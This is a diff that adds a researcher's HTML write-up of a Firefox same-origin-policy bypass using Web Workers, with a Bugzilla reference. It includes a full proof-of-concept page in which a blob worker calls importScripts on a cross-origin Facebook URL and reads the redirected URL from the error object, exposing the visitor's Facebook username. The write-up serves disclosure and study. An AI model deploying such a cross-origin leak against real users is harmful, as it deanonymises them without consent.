@@ -1,0 +1,87 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox SOP bypass Using Workers - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox SOP bypass Using Workers</h1>
+<br>
+
+<p>
+Whilst investigating the Worker implementation in Firefox, I noticed that some information leak is happening. Basically, if you go to a URL like <code>http://www.facebook.com/me</code> (assuming you're logged in) you will get redirected to your own facebook page, which usually contains your name in the URL itself.
+<br>And in the worker we basically did a try-catch and then I noticed the error object passed had a bit more information than what I noticed in a normal context, I was able to get the URL name after redirection when its supposed to only show the initial URL.
+
+
+<h2>Original PoC code:</h2>
+<!-- HTML generated using hilite.me --><div class="qCode" style=" overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">&lt;!DOCTYPE html&gt;</span>
+	<span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+		<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+			<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>SOP bypass using workers - Sensitive data retrieval PoC - Abdulrahman Alqabandi<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+			
+			<span style="color: #000080; font-weight: bold">&lt;script </span><span style="color: #FF0000">type=</span><span style="color: #0000FF">&quot;application/javascript&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+				window.onload=()=&gt;{
+					<span style="color: #008800; font-style: italic">//Our worker. onerror=&gt;log(error) &amp;&amp; onmsg=&gt;eval(msg)</span>
+					<span style="color: #000080; font-weight: bold">var</span> workerText=<span style="color: #0000FF">&#39;onerror=function(q){console.log(&quot;err&quot;+q);};onmessage=function(q){console.log(&quot;Will eval:&quot;+q.data);eval(q.data)};&#39;</span>;
+					
+					<span style="color: #008800; font-style: italic">//Create our worker with some blob: url.</span>
+					<span style="color: #000080; font-weight: bold">var</span> qWorker=<span style="color: #000080; font-weight: bold">new</span> Worker(URL.createObjectURL(<span style="color: #000080; font-weight: bold">new</span> Blob([workerText])));
+					
+					<span style="color: #008800; font-style: italic">//Alert any data recieved by our new worker</span>
+					qWorker.onmessage=(q)=&gt;{alert(q.data);};
+					
+					
+					document.getElementById(<span style="color: #0000FF">&#39;qab&#39;</span>).onmousedown=()=&gt;{
+					<span style="color: #008800; font-style: italic">//This is the vulnerable part.</span>
+					<span style="color: #008800; font-style: italic">//The importScripts() function does not check cross-origins and will try to execute any data returned by the xorigin url.</span>
+					<span style="color: #008800; font-style: italic">//However, if we catch an error, the URL is exposed in the error object(after redirection). </span>
+						qWorker.postMessage(<span style="color: #0000FF">&quot;try{importScripts(&#39;https://m.facebook.com/me&#39;)}catch(e){this.postMessage(e.fileName)}&quot;</span>);
+						};
+				};
+			
+			<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+		<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+		<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+			<span style="color: #000080; font-weight: bold">&lt;input</span> <span style="color: #FF0000">type=</span><span style="color: #0000FF">&quot;button&quot;</span> <span style="color: #FF0000">value=</span><span style="color: #0000FF">&quot;Get my facebook name!&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qab&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+		<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+		
+	<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+
+
+</p><br>
+<br>Although the report is valid, it was a duplication.
+
+
+<p>
+<h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1218110" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1218110</a><br>
+
+<br>
+
+</p>
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
